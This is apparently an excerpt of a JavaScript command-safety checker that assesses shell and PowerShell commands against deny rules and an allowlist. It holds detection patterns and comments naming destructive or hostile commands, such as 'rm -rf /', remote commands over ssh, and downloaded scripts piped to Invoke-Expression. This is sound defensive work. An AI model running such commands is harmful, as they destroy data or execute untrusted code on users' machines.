// Lexically normalise a path for the danger checks: `//`, `/./`, a trailing `/.` and `/..` collapse
// (`rm -rf /.`, `rm -rf //`, `rm -r /etc/../`), so they are compared as the directory they name.
// Only absolute, ~ and $HOME paths; a `..` above the home prefix is kept as is.
export function normTarget(t) {
  const s = String(t).trim();
  const m = s.match(/^(\/|~(?=\/|$)|\$\{?HOME\}?(?=\/|$))(.*)$/s);

    if (p === '..' && parts.length && parts[parts.length - 1] !== '..') { parts.pop(); continue; }
    if (p === '..' && root) continue;
    parts.push(p);
  }
  const prefix = root ? '' : m[1];
  return parts.length ? prefix + '/' + parts.join('/') : (root ? '/' : prefix);

// system directories (and their direct children), user homes and key dot-directories: a recursive

  [/\btee\b/, 'medium', 'tee writes to a file'],
  [/\bsed\s+(?:-\S+\s+)*(?:-i|--in-place)\b/, 'medium', 'edits files in place'],

  [/\b(?:Stop|Restart)-Computer\b|\bshutdown(?:\.exe)?\s+\/[srp]\b/i, 'high', 'shuts down / reboots the machine'],

  [/\b(?:iex|Invoke-Expression)\b[^|;]*\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|curl|wget|DownloadString|DownloadData|Net\.WebClient)\b|\[scriptblock\]::Create\([^;]*\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|DownloadString)\b/i, 'high', 'runs a downloaded script'],
  [/\bSet-ExecutionPolicy\b|\bStart-Process\b.*-Verb\s+RunAs/i, 'medium', 'changes security policy / elevates'],
  [/\b(?:Stop|Restart|Start|Set)-Service\b/i, 'medium', 'changes a service'],
  [/\b(?:Set-Content|Out-File|Add-Content|Rename-Item|Move-Item|Copy-Item|New-Item|Set-Acl|Compress-Archive|Expand-Archive)\b/i, 'medium', 'modifies files'],

// `git -C dir -c k=v --no-pager reset` -> `git reset`; `docker --context x -H h rm` -> `docker rm`
const OPTVAL = String.raw`(?:'[^']*'|"[^"]*"|[^\s;&|'"])+`;
const GIT_GLOBALS = new RegExp(String.raw`\bgit((?:\s+(?:(?:-C|-c|--git-dir|--work-tree|--namespace|--super-prefix|--config-env|--exec-path)\s+${OPTVAL}|-(?!-\s)${OPTVAL}))+)(?=\s+[a-z])`, 'g');
const DOCKER_GLOBALS = new RegExp(String.raw`\bdocker((?:\s+(?:(?:-H|--host|-c|--context|--config|-l|--log-level|--tls\w*)\s+${OPTVAL}|-(?!-\s)${OPTVAL}))+)(?=\s+[a-z])`, 'g');
export function normalizeGlobals(command) {
  return String(command).replace(GIT_GLOBALS, 'git').replace(DOCKER_GLOBALS, 'docker');
}

// ---------------------------------------------------------------------------------------------
// Allowlist (v0.3): only the commands and flags tellsh knows are safe. The known set is what the catalog itself renders
// for every shell (src/allowlist-data.js, generated by scripts/build_allowlist.js and checked by a test). Any wrapper
// (sudo, env, timeout, xargs, nohup, bash -c, ...), an environment assignment in front of a command, a program the set
// does not have, a subcommand of a multi-command tool it does not have (`git filter-branch`, `npx cowsay`) or a flag it
// does not have for that command (`gh pr merge --admin`, `rm -P`) makes the command high risk: it is shown with the
// reason and needs an explicit confirmation. The deny rules above still run; the allowlist only ever escalates.

// tools whose first words name a subcommand (`git push`, `docker compose up`, `npx wrangler deploy`, `gh pr merge`)
export const SUB_DEPTH = { git: 1, docker: 2, podman: 2, npm: 1, npx: 3, pnpm: 1, yarn: 1, gh: 2, systemctl: 1, apt: 1, 'apt-get': 1,
  dnf: 1, yum: 1, brew: 1, winget: 1, pip: 1, pip3: 1, kubectl: 1, wrangler: 2, timedatectl: 1, journalctl: 0, launchctl: 1,
  certutil: 0, python3: 0, py: 0 };
const PWSH_CMDLET = /^[a-z]+-[a-z]+$/;
// `-w32`, `-n5`: an option with its number attached is the option
const flagKey = (head, f) => {
  let x = String(f);
  if (/^--[^=]+=/.test(x)) x = x.replace(/=.*$/s, '=');
  else if (/^\/[A-Za-z?]{1,2}:/.test(x)) x = x.replace(/:.*$/s, ':');
  else if (/^-[A-Za-z]\d+$/.test(x)) x = x.replace(/\d+$/, '#');
  return PWSH_CMDLET.test(head) ? x.toLowerCase() : x;
};
// a word that is an option: -x, --long, -Param (PowerShell), /x (cmd.exe, short: never a path like /tmp); `-3`, `-10M`
// (find -mtime -3) and `-` (stdin) are values
const isFlag = (w) => /^-(?!\d)[^\s]/.test(w) && w !== '--' || /^\/[A-Za-z?]{1,2}(?::\S*)?$/.test(w) || /^\/[+-]\w*$/.test(w);
// the program as written: a path (`./x`, `/tmp/ls`, `C:\\t\\ls.exe`) is not the allowlisted program of the same name
const baseName = (w) => String(w).replace(/\.exe$/i, '').toLowerCase();
// a value the catalog renders where the tokenizer expects a program, by its shape: a number (`(Get-Date).AddMinutes(-4320)`),
// an argument list item (`.Replace('a', 'b')`), an environment variable (`$env:FOO`). Any other word is a program as written.
export const headKey = (w) => {
  const x = baseName(w);
  if (/^-?\d+(?:\.\d+)?$/.test(x)) return '<num>';
  if (/,$/.test(x) && x.length > 1) return '<arg>,';
  if (/^\$env:[a-z_]\w*$/.test(x)) return '$env:<var>';
  return x;
};

/**
 * The shape of one simple command: { head, key (head + known subcommand words), flags, assign, rest }.
 * `known(key)` says whether a longer key exists (checking); without it the subcommand words are taken up to SUB_DEPTH
 * (building the allowlist from rendered templates, where `literal(w)` tells a template word from an inserted value).
 */
export function commandShape(words, { known, literal = () => true } = {}) {
  let i = 0;
  const assign = [];
  while (i < words.length && /^[A-Za-z_]\w*=/.test(words[i])) assign.push(words[i++]);
  const head = headKey(words[i] ?? '');
  let key = head;
  let j = i + 1;
  const depth = SUB_DEPTH[head] ?? 0;
  for (let d = 0; d < depth && j < words.length; d++) {
    const w = String(words[j]);
    if (isFlag(w) || /^\d+$/.test(w) || !literal(w)) break;
    const next = `${key} ${w.toLowerCase()}`;
    if (known && !known(next)) break;
    key = next;
    j++;
  }
  const flags = [];
  const rest = [];
  let opts = true;
  for (; j < words.length; j++) {
    const w = String(words[j]);
    if (opts && w === '--') { opts = false; continue; }
    if (opts && isFlag(w)) flags.push(w); else rest.push(w);
  }
  return { head, key, flags, assign, rest };
}

// ssh: host plus a remote command (`ssh host rm -rf /`) runs that command; options with a value are not operands
const SSH_OPTARG = /^-[BbcDEeFIiJLlmOoPpQRSWw]$/;
const sshOperands = (words) => { let n = 0; for (let k = 1; k < words.length; k++) { if (SSH_OPTARG.test(words[k])) k++; else if (!/^-/.test(words[k])) n++; } return n; };
// shell keywords in front of a command (`… do taskkill`, `else New-Item …`, `& 'node'`): syntax, not a wrapper
export const KEYWORDS = new Set(['then', 'do', 'else', 'elif', '&', '!', 'time']);
// `$(…)`, `` `…` `` (also inside "…") and `<(…)` / `>(…)` outside '…' run a command the allowlist cannot see as written;
// `$((…))` with an arithmetic body is arithmetic, not a command
export function substitution(command) {
  const s = String(command);
  let dq = false;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (c === '\\') { i++; continue; }
    if (c === '$' && s[i + 1] === "'" && !dq) { i = ansiEnd(s, i); continue; }
    if (c === "'" && !dq) { const j = s.indexOf("'", i + 1); if (j < 0) return null; i = j; continue; }
    if (c === '"') { dq = !dq; continue; }
    if (c === '`') return 'command';
    if (c === '$' && s[i + 1] === '(') {
      const m = s.slice(i).match(/^\$\(\(([^()]*(?:\([^()]*\)[^()]*)*)\)\)/);
      if (m && !m[1].includes('$(') && /^[\w\s+\-*/%$]*$/.test(m[1].replace(/[()]/g, ''))) { i += m[0].length - 1; continue; }
      return 'command';
    }
    if (!dq && (c === '<' || c === '>') && s[i + 1] === '(') return 'process';
  }
  return null;
}

let PREFIXES = null;
/** Problems the allowlist finds in a command ([] when every simple command, subcommand and flag is known). */
export function allowlistProblems(command, { extra = null } = {}) {
  const table = ALLOW;
  // extra: { key: flags } a caller vouches for (the composer's validated tool vocabulary), added to the table's
  const keyFlags = (k) => (extra?.[k] ? [...(table[k] || []), ...extra[k].map((f) => flagKey(k.split(' ')[0], f))] : table[k]);
  PREFIXES ??= new Set(Object.keys(ALLOW).flatMap((k) => k.split(' ').slice(1).map((_, i, a) => k.split(' ').slice(0, i + 1).join(' '))));
  const prefix = (k) => PREFIXES.has(k) || (extra && Object.keys(extra).some((e) => e.startsWith(k + ' ')));
  const out = [];
  const seen = new Set();
  const add = (m) => { if (!seen.has(m)) { seen.add(m); out.push(m); } };
  const subst = substitution(command);
  if (subst) add(`runs a ${subst} substitution; not on the allowlist`);
  for (let words of [...simpleCommands(command), ...simpleCommands(command, { winPaths: true })]) {
    while (words.length && KEYWORDS.has(String(words[0]).toLowerCase())) words = words.slice(1);
    if (!words.length) continue;
    const sh = commandShape(words, { known: (k) => keyFlags(k) != null || prefix(k) });
    if (sh.assign.length) add(`sets environment variables for the command (${sh.assign.map((a) => a.split('=')[0]).join(', ')}); not on the allowlist`);
    if (!sh.head) continue;
    // a wrapper with an operand runs it (`sudo rm x`, `timeout 5 ls`, `bash -c "…"`); alone it is a program (`env | sort`)
    if (((WRAPPERS.has(sh.head) || RUNNERS.has(sh.head)) && sh.head !== 'ssh' && sh.rest.length) || (SHELLS.test(sh.head) && sh.flags.some((f) => /^-[a-z]*c[a-z]*$/i.test(f)))) {
      add(`runs another command through a wrapper (${sh.head}); only commands on the allowlist are trusted`);
      continue;
    }
    if (sh.head === 'ssh' && sshOperands(words) > 1) {
      add('runs a remote command over ssh; not on the allowlist');
      continue;
    }
    const allowed = keyFlags(sh.key);
    if (allowed == null && prefix(sh.key)) { add(`unknown subcommand (${[sh.key, ...sh.rest.slice(0, 1)].join(' ')}); not on the allowlist`); continue; }
    if (allowed == null) { add(`unknown command (${sh.key}); not on the allowlist`); continue; }
    if ((SUB_DEPTH[sh.head] ?? 0) > 0 && sh.key === sh.head && sh.rest.length && !allowed.includes('*sub')) {
      add(`unknown subcommand (${sh.head} ${sh.rest[0]}); not on the allowlist`);
      continue;
    }
    for (const f of sh.flags) {
      const k = flagKey(sh.head, f);
      if (allowed.includes(k) || (/^-[A-Za-z]#$/.test(k) && allowed.includes(k.slice(0, 2)))) continue;
      // a cluster of known single-letter options (`ls -la` when -l and -a are known)
      if (/^-[A-Za-z]{2,}$/.test(f) && !PWSH_CMDLET.test(sh.head) && [...f.slice(1)].every((c) => allowed.includes(`-${c}`))) continue;
      add(`unknown option ${f} for ${sh.key}; not on the allowlist`);
    }
  }
  return out;
}

/**
 * The parser's reading of a command: deny rules, structural checks and the allowlist. It only ever raises `baseRisk`;
 * a `safe` result here does not make a command safe (see checkDanger).
 * @returns {{risk:'safe'|'medium'|'high', warnings:string[], critical:boolean}}
 */
export function assessCommand(command, baseRisk = 'safe', { lenient = false, allowlist = null } = {}) {
  let risk = baseRisk;
  const warnings = [];
  let critical = false;
  const hit = (r, msg, crit) => {
    risk = maxRisk(risk, r);
    if (!warnings.includes(msg)) warnings.push(msg);
    if (crit) critical = true;
  };
  const text = normalizeGlobals(command);
  const inner = [];
  const flags = {};
  // structural checks run on both readings of backslashes (POSIX escapes / Windows path separators)
  for (const words of [...simpleCommands(text), ...simpleCommands(text, { winPaths: true })]) {
   for (const w of commandChains(words, inner, flags)) {
    const head = w[0].replace(/^.*[\\/]/, '');
    const lower = head.toLowerCase().replace(/\.exe$/, '');
    // a lone string with spaces is a command handed to another program ('…' | bash)
    if (w.length === 1 && /\s/.test(w[0])) inner.push(w[0]);
    // the program itself depends on the shell state (`$CMD -rf /`, `$(which rm) -rf /`, `& $tool`): unknown
    if (!lenient && /^[$`]/.test(head)) hit('high', 'runs a command whose name depends on the shell state; it cannot be checked');
    if (head === 'rm' || head === 'unlink') rmCheck(w, hit);
    else if (head === 'kill') killCheck(w, hit);
    else if (/^(?:rd|rmdir|del|erase)$/i.test(head)) {
      const a = w.slice(1);
      if (!a.some((x) => /^\/[a-z]$/i.test(x)) && a.some((x) => /^-\w/.test(x))) removeItemCheck(w, hit);
      else cmdDelCheck(w, hit);
    } else if (PS_REMOVE.test(lower)) removeItemCheck(w, hit);
    else if (head === 'find') findCheck(w, hit);
    else if (head === 'rsync') rsyncCheck(w, hit);
    else if (['cp', 'mv', 'install', 'ln'].includes(head)) copyCheck(w, hit);
    else if (['chmod', 'chown', 'chgrp'].includes(head)) permCheck(w, hit);
    else if (head === 'tar' || head === 'bsdtar' || head === 'gtar') tarCheck(w, hit);
    else if (head === 'docker' || head === 'podman') dockerCheck(w, hit);
    else if (lower === 'sed' || lower === 'gsed') sedCheck(w, hit);
    if (['tee', 'cp', 'install', 'sponge', 'pv', 'mv', 'ln'].includes(lower)) rawDiskWriteCheck(w, hit);
    interpCheck(w, hit);
    projectCodeCheck(w, flags);
    stdinCodeCheck(w, hit, inner);
    if (head === 'git' && w[1] === 'rm') hit('high', 'rm deletes files permanently (no trash)');
    sysFileWriteCheck(w, head, hit);
